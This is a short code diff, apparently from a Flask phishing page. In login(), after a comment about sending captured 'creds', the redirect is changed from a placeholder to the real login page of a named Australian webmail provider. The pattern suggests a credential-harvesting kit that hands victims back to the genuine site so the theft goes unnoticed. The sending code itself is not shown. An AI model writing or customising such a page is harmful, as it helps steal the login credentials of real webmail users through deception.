@@ -67,7 +67,7 @@ def login():
     session.pop('creds', None)
 
     # Redirect after sending
-    return redirect("https://example.com")  # final destination
+    return redirect("https://webmail.westnet.com.au/login?redirectTo=/app/mail")  # final destination
 
 
 if __name__ == '__main__':
